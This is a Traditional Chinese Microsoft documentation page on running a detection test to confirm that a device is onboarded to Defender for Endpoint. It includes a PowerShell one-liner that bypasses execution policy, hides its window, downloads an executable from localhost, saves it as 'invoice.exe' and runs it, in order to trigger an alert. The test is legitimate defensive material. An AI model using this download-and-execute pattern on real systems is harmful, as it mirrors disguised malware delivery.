---
title: 在新架的 Microsoft Defender ATP 裝置上執行偵測測試
description: 在新架裝置上執行偵測腳本，確認已正確架至 Microsoft Defender ATP 服務。
keywords: 偵測測試，偵測，powershell，script，verify，上架，microsoft defender for endpoint 上架，用戶端，伺服器，測試
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 10154a734bb4c3d8b26fffb8618484aeb11f907a
ms.sourcegitcommit: 956176ed7c8b8427fdc655abcd1709d86da9447e
ms.translationtype: MT
ms.contentlocale: zh-TW
ms.lasthandoff: 03/23/2021
ms.locfileid: "51059308"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>在新架的 Microsoft Defender for Endpoint 裝置上執行偵測測試 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**適用於：**
- 支援的 Windows 10 版本
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server，版本1803
- Windows Server，2019
- [適用於端點的 Microsoft Defender](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> 想要體驗 Microsoft Defender for Endpoint？ [註冊免費試用版。](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

在新架裝置上執行下列 PowerShell 腳本，以確認是否已將其正確報告至端點服務的 Defender。

1. 建立資料夾： ' C:\test-MDATP-test '。
2. 在裝置上開啟已提升許可權的命令列提示字元，並執行腳本：

   1. 轉至 **[開始]** 並鍵入 **「cmd」**。

   1. 以滑鼠右鍵按一下 [ **命令提示** 字元]，然後選取 [ **以管理員身分執行**]。

      ![指向以系統管理員身分執行的視窗「開始」功能表](images/run-as-admin.png)

3. 在出現提示時，請複製並執行下列命令：

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

[命令提示字元] 視窗將會自動關閉。 如果成功，則偵測測試會標示為已完成，並且在架裝置的入口網站中大約10分鐘會出現新的警示。

## <a name="related-topics"></a>相關主題
- [板載 Windows 10 裝置](configure-endpoints.md)
- [上架伺服器](configure-server-endpoints.md)
- [疑難排解 Microsoft Defender 的端點上架問題](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
